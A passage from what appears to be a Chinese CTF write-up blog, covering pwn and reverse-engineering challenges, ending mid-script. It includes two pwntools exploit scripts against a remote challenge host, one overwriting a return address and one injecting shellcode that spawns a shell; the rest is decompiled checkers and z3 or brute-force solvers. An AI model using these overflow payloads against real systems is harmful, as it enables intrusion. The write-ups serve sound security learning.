<h1 id="猜猜flag"><a href="#猜猜flag" class="headerlink" title="猜猜flag"></a>猜猜flag</h1><h1 id="走后门吗"><a href="#走后门吗" class="headerlink" title="走后门吗"></a>走后门吗</h1><p>有后门函数直接可以开shell，直接栈溢出覆盖返回地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;123.206.131.120&quot;,10001)</span><br><span class="line">backdoor_add=0x4006e0</span><br><span class="line">sh.recv()</span><br><span class="line">payload=&quot;a&quot;*0x58+p64(backdoor_add)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="后门？不存在的"><a href="#后门？不存在的" class="headerlink" title="后门？不存在的"></a>后门？不存在的</h1><p>和上面一题基本差不多，不过没有后门函数了。同样的栈溢出，没开nx保护，同时会打印出存放输入的内存地址，找了个shellcode：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;123.206.131.120&quot;,10002)</span><br><span class="line">sh.recvuntil(&quot;is&quot;)</span><br><span class="line">sh.recv(3)</span><br><span class="line">add=int(sh.recv(12),16)</span><br><span class="line">shellcode=&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line">payload=shellcode+&apos;\x90&apos;*(0x58-len(shellcode))+p64(add)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="做出了后门也不给你走"><a href="#做出了后门也不给你走" class="headerlink" title="做出了后门也不给你走"></a>做出了后门也不给你走</h1>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-sus-gccc" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/10/25/sus-gccc/" class="article-date">
      <time datetime="2018-10-25T13:51:39.000Z" itemprop="datePublished">2018-10-25</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/25/sus-gccc/">sus-gccc</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>.net程序，dnspy反编译一波：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// Token: 0x02000002 RID: 2</span><br><span class="line">public class GrayCCC</span><br><span class="line">&#123;</span><br><span class="line">	// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458</span><br><span class="line">	public static void Main()</span><br><span class="line">	&#123;</span><br><span class="line">		Console.Write(&quot;Input the key: &quot;);</span><br><span class="line">		uint num;</span><br><span class="line">		if (!uint.TryParse(Console.ReadLine().Trim(), out num))</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		string text = &quot;&quot;;</span><br><span class="line">		string text2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125; &quot;;</span><br><span class="line">		int num2 = 0;</span><br><span class="line">		byte[] array = new byte[]</span><br><span class="line">		&#123;</span><br><span class="line">			164,</span><br><span class="line">			25,</span><br><span class="line">			4,</span><br><span class="line">			130,</span><br><span class="line">			126,</span><br><span class="line">			158,</span><br><span class="line">			91,</span><br><span class="line">			199,</span><br><span class="line">			173,</span><br><span class="line">			252,</span><br><span class="line">			239,</span><br><span class="line">			143,</span><br><span class="line">			150,</span><br><span class="line">			251,</span><br><span class="line">			126,</span><br><span class="line">			39,</span><br><span class="line">			104,</span><br><span class="line">			104,</span><br><span class="line">			146,</span><br><span class="line">			208,</span><br><span class="line">			249,</span><br><span class="line">			9,</span><br><span class="line">			219,</span><br><span class="line">			208,</span><br><span class="line">			101,</span><br><span class="line">			182,</span><br><span class="line">			62,</span><br><span class="line">			92,</span><br><span class="line">			6,</span><br><span class="line">			27,</span><br><span class="line">			5,</span><br><span class="line">			46</span><br><span class="line">		&#125;;</span><br><span class="line">		byte b = 0;</span><br><span class="line">		while (num != 0u)</span><br><span class="line">		&#123;</span><br><span class="line">			char c = (char)(array[num2] ^ (byte)num ^ b);</span><br><span class="line">			if (!text2.Contains(new string(c, 1)))</span><br><span class="line">			&#123;</span><br><span class="line">				Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			text += c;</span><br><span class="line">			b ^= array[num2++];</span><br><span class="line">			num &gt;&gt;= 1;</span><br><span class="line">		&#125;</span><br><span class="line">		if (text.Substring(0, 5) != &quot;FLAG&#123;&quot; || text.Substring(31, 1) != &quot;&#125;&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		Console.WriteLine(&quot;Your flag is: &quot; + text);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定义了uint类型变量num，<code>text[i]=array[i]^(num&amp;0xff)^b</code>，<code>b=array[0]^...^array[i]</code>，最后要求text的前五位为FLAG{，最后一位为}，并且每一位都是大写字母，题目推荐使用z3求解。<br>脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">num=BitVec(&quot;num&quot;,33)</span><br><span class="line">array=[     </span><br><span class="line">            164,</span><br><span class="line">			25,</span><br><span class="line">			4,</span><br><span class="line">			130,</span><br><span class="line">			126,</span><br><span class="line">			158,</span><br><span class="line">			91,</span><br><span class="line">			199,</span><br><span class="line">			173,</span><br><span class="line">			252,</span><br><span class="line">			239,</span><br><span class="line">			143,</span><br><span class="line">			150,</span><br><span class="line">			251,</span><br><span class="line">			126,</span><br><span class="line">			39,</span><br><span class="line">			104,</span><br><span class="line">			104,</span><br><span class="line">			146,</span><br><span class="line">			208,</span><br><span class="line">			249,</span><br><span class="line">			9,</span><br><span class="line">			219,</span><br><span class="line">			208,</span><br><span class="line">			101,</span><br><span class="line">			182,</span><br><span class="line">			62,</span><br><span class="line">			92,</span><br><span class="line">			6,</span><br><span class="line">			27,</span><br><span class="line">			5,</span><br><span class="line">			46]</span><br><span class="line">b=range(32)</span><br><span class="line">for i in range(32):</span><br><span class="line">	temp=0</span><br><span class="line">	for j in range(i):</span><br><span class="line">		temp^=array[j]</span><br><span class="line">	b[i]=temp</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;))</span><br><span class="line">solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))</span><br><span class="line">solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))</span><br><span class="line">solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))</span><br><span class="line">solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))</span><br><span class="line">for i in range(5,31):	</span><br><span class="line">	solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=126)</span><br><span class="line">	solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=32)</span><br><span class="line">solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))</span><br><span class="line">if solver.check()==sat :</span><br><span class="line">	print solver.model()</span><br><span class="line">right_num=3658134498</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(32):</span><br><span class="line">	flag+=chr(array[i]^((right_num&gt;&gt;i)&amp;0xff)^b[i])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-实验吧-3" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/10/24/实验吧-3/" class="article-date">
      <time datetime="2018-10-24T10:40:16.000Z" itemprop="datePublished">2018-10-24</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/24/实验吧-3/">实验吧-3</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="逆向观察"><a href="#逆向观察" class="headerlink" title="逆向观察"></a>逆向观察</h1><p>直接拖ida里打开，主函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  if ( argc &lt;= 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;usage ./rev50 password&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    src = &apos;sedecrem&apos;;</span><br><span class="line">    v6 = 0;</span><br><span class="line">    v7 = 0;</span><br><span class="line">    v8 = 0;</span><br><span class="line">    memcpy(&amp;dest, &amp;src, 9uLL);</span><br><span class="line">    for ( i = 0; i &lt;= 999; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !strcmp(argv[1], (&amp;dict)[i]) &amp;&amp; !strcmp(&amp;dest, (&amp;dict)[i]) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;Good password ! &quot;);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Bad ! password&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_10:</span><br><span class="line">  puts(&amp;byte_40252A);</span><br><span class="line">  return 0;</span><br></pre></td></tr></table></figure>
<p>Good password的判断条件就是输入=src，需要注意的是这里的字符串是应该倒过来看的，所以应该是mercedes。</p>
<h1 id="bitwise"><a href="#bitwise" class="headerlink" title="bitwise"></a>bitwise</h1><p>下载下来一个rar，解压后可以得到一个java程序和一个py程序，看上去应该功能是一样的，不会java所以就分析py吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">user_submitted = raw_input(&quot;Enter Password: &quot;)</span><br><span class="line"></span><br><span class="line">if len(user_submitted) != 10:</span><br><span class="line">  print &quot;Wrong&quot;</span><br><span class="line">  exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]</span><br><span class="line">user_arr = []</span><br><span class="line">for char in user_submitted:</span><br><span class="line">  # &apos;&lt;&lt;&apos; is left bit shift</span><br><span class="line">  # &apos;&gt;&gt;&apos; is right bit shift</span><br><span class="line">  # &apos;|&apos; is bit-wise or</span><br><span class="line">  # &apos;^&apos; is bit-wise xor</span><br><span class="line">  # &apos;&amp;&apos; is bit-wise and</span><br><span class="line">  user_arr.append( (((ord(char) &lt;&lt; 5) | (ord(char) &gt;&gt; 3)) ^ 111) &amp; 255 )</span><br><span class="line"></span><br><span class="line">if (user_arr == verify_arr):</span><br><span class="line">  print &quot;Success&quot;</span><br><span class="line">else:</span><br><span class="line">  print &quot;Wrong&quot;</span><br></pre></td></tr></table></figure>
<p>爆破一发：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]</span><br><span class="line">for i in range(len(verify_arr)):</span><br><span class="line">	for j in string.printable:</span><br><span class="line">		if (((ord(j) &lt;&lt; 5) | (ord(j) &gt;&gt; 3)) ^ 111) &amp; 255 == verify_arr[i] :</span><br><span class="line">			flag+=j</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<h1 id="Byte-Code"><a href="#Byte-Code" class="headerlink" title="Byte Code"></a>Byte Code</h1><p>下载得到一个.class文件，用jd-gui试试,结果会报错<code>INTERNAL ERROR</code>，百度了一下,用luyten试试打开了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">class Authenticator</span><br><span class="line">&#123;</span><br><span class="line">    public static char[] key;</span><br><span class="line">    </span><br><span class="line">    public static void main(final String[] array) &#123;</span><br><span class="line">        (Authenticator.key = new char[10])[0] = &apos;A&apos;;</span><br><span class="line">        Authenticator.key[1] = &apos;o&apos;;</span><br><span class="line">        Authenticator.key[2] = &apos;J&apos;;</span><br><span class="line">        Authenticator.key[3] = &apos;k&apos;;</span><br><span class="line">        Authenticator.key[4] = &apos;V&apos;;</span><br><span class="line">        Authenticator.key[5] = &apos;h&apos;;</span><br><span class="line">        Authenticator.key[6] = &apos;L&apos;;</span><br><span class="line">        Authenticator.key[7] = &apos;w&apos;;</span><br><span class="line">        Authenticator.key[8] = &apos;U&apos;;</span><br><span class="line">        Authenticator.key[9] = &apos;R&apos;;</span><br><span class="line">        final Console console = System.console();</span><br><span class="line">        for (String line = &quot;&quot;; !line.equals(&quot;ThisIsth3mag1calString4458&quot;); line = console.readLine(&quot;Enter password:&quot;, new Object[0])) &#123;&#125;</span><br><span class="line">        for (int i = 0; i &lt; Authenticator.key.length; ++i) &#123;</span><br><span class="line">            System.out.print(Authenticator.key[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然不会java但是这么简单的代码还是可以看看的，AoJkVhLwUR就是输入正确时得到的flag。（luyten真给力啊</p>
<h1 id="CFG-to-C"><a href="#CFG-to-C" class="headerlink" title="CFG to C"></a>CFG to C</h1><p>汇编代码和c代码配对就行了，不过其实根据逻辑图就能判断。</p>
<p><img src="http://ctf5.shiyanbar.com/reverse/cfg-to-c/func1.png" alt=""></p>
<p>对应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int loop(int a)</span><br><span class="line">        &#123;</span><br><span class="line">            while (a &gt;= 0) &#123;</span><br><span class="line">                a--;</span><br><span class="line">            &#125;</span><br><span class="line">            return a;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://ctf5.shiyanbar.com/reverse/cfg-to-c/func2.png" alt=""></p>
<p>对应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int control(int a, int b)</span><br><span class="line">        &#123;    </span><br><span class="line">            if (a &gt; b)</span><br><span class="line">                return b;</span><br><span class="line">            else </span><br><span class="line">                return a;  </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://ctf5.shiyanbar.com/reverse/cfg-to-c/func3.png" alt=""></p>
<p>对应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int for_loop(int a, int b, int c)</span><br><span class="line">        &#123;</span><br><span class="line">            int i;</span><br><span class="line"></span><br><span class="line">            for(i = 0; i &lt; b; i++)</span><br><span class="line">                 a = c + i;</span><br><span class="line">            return a;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://ctf5.shiyanbar.com/reverse/cfg-to-c/func4.png" alt=""></p>
<p>对应</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int modulo(int a, int b)</span><br><span class="line">        &#123;</span><br><span class="line">            return b % a;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h1 id="catalyst-system"><a href="#catalyst-system" class="headerlink" title="catalyst-system"></a>catalyst-system</h1><p>ida打开，main函数中关键部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Username: &quot;);</span><br><span class="line">__isoc99_scanf(&quot;%s&quot;, v8);</span><br><span class="line">printf(&quot;Password: &quot;, v8);</span><br><span class="line">__isoc99_scanf(&quot;%s&quot;, v7);</span><br><span class="line">printf(&quot;Logging in&quot;, v7);</span><br><span class="line">fflush(stdout);</span><br><span class="line">for ( j = 0; j &lt;= 29; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  v5 = rand();</span><br><span class="line">  sleep(v5 % (j + 1));</span><br><span class="line">  putchar(&apos;.&apos;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">&#125;</span><br><span class="line">putchar(10);</span><br><span class="line">sub_400C9A((__int64)v8);</span><br><span class="line">sub_400CDD(v8);</span><br><span class="line">sub_4008F7((__int64)v8);</span><br><span class="line">sub_400977(v8, v7);</span><br><span class="line">sub_400876((__int64)v8, (__int64)v7);</span><br><span class="line">return 0LL;</span><br></pre></td></tr></table></figure>
<p>输入账号密码后接下来几个函数进行账号密码验证与输出flag。</p>
<p>sub_400876就是输出flag的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">char *s; // [rsp+0h] [rbp-30h]</span><br><span class="line">int i; // [rsp+1Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">printf(&quot;your flag is: ALEXCTF&#123;&quot;, a2, a1);</span><br><span class="line">for ( i = 0; i &lt; strlen(s); ++i )</span><br><span class="line">  putchar((unsigned __int8)byte_6020A0[i] ^ s[i]);</span><br><span class="line">return puts(&quot;&#125;&quot;);</span><br></pre></td></tr></table></figure>
<p>可以看见flag的格式了，不过不知道s处的字符串是啥，只能看看上面的函数。</p>
<p><code>sub_400c9a</code>限制了账号的长度大于8小于16且为4的倍数，所以长度就是12。</p>
<p><code>sub_400cdd</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v4 = *a1;</span><br><span class="line">v3 = a1[1];</span><br><span class="line">v2 = a1[2];</span><br><span class="line">if ( v4 - v3 + v2 != 0x5C664B56</span><br><span class="line">  || v3 + 3 * (v2 + v4) != 0x2E700C7B2LL</span><br><span class="line">  || (result = 0x32AC30689A6AD314LL, v2 * v3 != 0x32AC30689A6AD314LL) )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;invalid username or password&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure>
<p>对账号进行了限制，给了三个条件表达式，这里可以使用z3求解,解得v4=0x6f65635f，v3=0x7473796c,v2=0x61746163。</p>
<p><code>sub_4008fc</code>函数限制了账号的字符位于’`’与’z’之间或者等于’_’。</p>
<p><code>sub_400977</code>通过随机函数生成密码，这里要用linux运行才是正确的。</p>
<p><code>sub_400876</code>密码异或一个数组得到flag。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-实验吧-2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/10/23/实验吧-2/" class="article-date">
      <time datetime="2018-10-23T09:14:59.000Z" itemprop="datePublished">2018-10-23</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/10/23/实验吧-2/">实验吧-2</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="有一个程序加密得到如下密文"><a href="#有一个程序加密得到如下密文" class="headerlink" title="有一个程序加密得到如下密文"></a>有一个程序加密得到如下密文</h1><p>又是pyc文件，反编译之后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"># 2018.10.23 17:05:34 CST</span><br><span class="line"># Embedded file name: ./rev200.py</span><br><span class="line">import sys</span><br><span class="line">from hashlib import md5</span><br><span class="line">import base64</span><br><span class="line">from time import time</span><br><span class="line">from datetime import datetime</span><br><span class="line">UC_KEY = &apos;123456789&apos;</span><br><span class="line"></span><br><span class="line">def authcode(string, operation = &apos;DECODE&apos;, key = UC_KEY, expiry = 0):</span><br><span class="line">    ckey_length = 4</span><br><span class="line">    if key == &apos;&apos;:</span><br><span class="line">        key = md5(UC_KEY.encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    else:</span><br><span class="line">        key = md5(key.encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    keya = md5(key[0:16].encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    keyb = md5(key[16:32].encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    if ckey_length == 0:</span><br><span class="line">        keyc = &apos;&apos;</span><br><span class="line">    elif operation == &apos;DECODE&apos;:</span><br><span class="line">        keyc = string[0:ckey_length]</span><br><span class="line">    elif operation == &apos;ENCODE&apos;:</span><br><span class="line">        keyc = 